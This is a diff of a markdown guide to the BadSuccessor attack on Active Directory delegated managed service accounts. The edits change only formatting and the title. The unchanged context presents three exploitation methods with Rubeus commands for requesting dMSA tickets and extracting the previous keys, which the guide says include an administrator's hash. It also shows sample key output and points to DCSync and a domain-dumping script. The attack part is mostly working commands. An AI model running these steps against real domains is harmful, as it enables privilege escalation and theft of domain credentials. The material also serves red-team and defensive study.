@@ -1,4 +1,4 @@
-# Mastering BadSuccessor: 3 Ways to Exploit dMSA for PrivEsc
+# BadSuccessor
 
 ## BadSuccessor?
 
@@ -20,11 +20,11 @@ Over the past few days, I explored the BadSuccessor attack through vulnerable en
 
 Below are three different ways to exploit this vulnerability.
 
----
+***
 
 ## Method 1 — Normal Way
 
-This method uses an existing domain user account that has permission to create dMSAs in an OU. 
+This method uses an existing domain user account that has permission to create dMSAs in an OU.
 
 ### Setup
 
@@ -56,7 +56,7 @@ Get-ADObject -Filter "name -like '*DMSA'"
 
 ### Request Tickets Using Rubeus
 
-```text
+```
 # Get dMSA TGT using your existing user TGT
 .\Rubeus.exe asktgs /targetuser:badDMSA$ /service:krbtgt/<DOMAIN> `
     /opsec /dmsa /nowrap /ticket:<YOUR_USER_TGT>.kirbi /outfile:dmsa_tgt.kirbi
@@ -65,7 +65,7 @@ Get-ADObject -Filter "name -like '*DMSA'"
 
 You can later use that ticket to perform DCSync with mimikatz or secretsdump.py
 
----
+***
 
 ## Method 2 — Machine Way
 
@@ -97,7 +97,7 @@ Set-ADServiceAccount -Identity badpcDMSA -Replace @{
 
 ### Request Tickets (Rubeus)
 
-```text
+```
 # Derive AES256 key from the computer account password
 .\Rubeus.exe hash /password:'<PASSWORD>' /user:BADPC$ /domain:<DOMAIN>
 
@@ -109,7 +109,7 @@ Set-ADServiceAccount -Identity badpcDMSA -Replace @{
     /opsec /dmsa /nowrap /ticket:badpc_tgt.kirbi /outfile:dmsa_tgt.kirbi
 ```
 
----
+***
 
 ## Method 3 — Previous Way
 
@@ -121,7 +121,7 @@ When you request a TGT for a dMSA, the KDC also issues a `KERB-DMSA-KEY-PACKAGE`
 
 Unfortunately, the developers of Rubeus are not giving the tool sufficient attention; as there is an open [pull request #204](https://github.com/GhostPack/Rubeus/pull/204) on Rubeus repoistory since May 2025, if you use the updated Rubeus PR, it automatically parses the previous keys from the ticket.
 
-```text
+```
 .\Rubeus.exe asktgs /targetuser:badDMSA$ /service:krbtgt/domain /opsec /dmsa /nowrap /ticket:your_ticket
 ...
  Current Keys for badDMSA$: (aes256_cts_hmac_sha1) 69CCB61333ABCF21AA0A549DFA84BF0AC92859FA9776EB013630E97E3EC12622
@@ -131,22 +131,21 @@ Unfortunately, the developers of Rubeus are not giving the tool sufficient atten
 
 ### Option B: Rubeus without #PR 204
 
-
 You can use standard Rubeus with debug flag to get the base64 output of the KDC reply that contains `KERB-DMSA-KEY-PACKAGE`:
 
-```text
+```
 .\Rubeus.exe asktgs /targetuser:badDMSA$ /service:krbtgt/DOMAIN /opsec /dmsa /nowrap /ticket:your_ticket /debug
 ```
 
 The output will be messy, search for `TGS request successful` and copy the base64 under it.
 
-<img width="2256" height="166" alt="image" src="https://github.com/user-attachments/assets/28b03711-292d-439c-842c-46d083907c57" />
+![image](https://github.com/user-attachments/assets/28b03711-292d-439c-842c-46d083907c57)
 
-go to an ASN.1 decoder like https://lapo.it/asn1js 
+go to an ASN.1 decoder like https://lapo.it/asn1js
 
 You will see many hashes, which are current keys and previous keys, the last one is the previous key which is the Admin hash
 
-<img width="1488" height="508" alt="Previous Way_image" src="https://github.com/user-attachments/assets/1eb9e87d-1484-4282-a927-df13ba1c8625" />
+![Previous Way\_image](https://github.com/user-attachments/assets/1eb9e87d-1484-4282-a927-df13ba1c8625)
 
 ### Option C: Dumping the Entire Domain via [dMSASync.py](https://gist.github.com/snovvcrash/a1ae180ab3b49acb43da8fd34e7e93df)
 
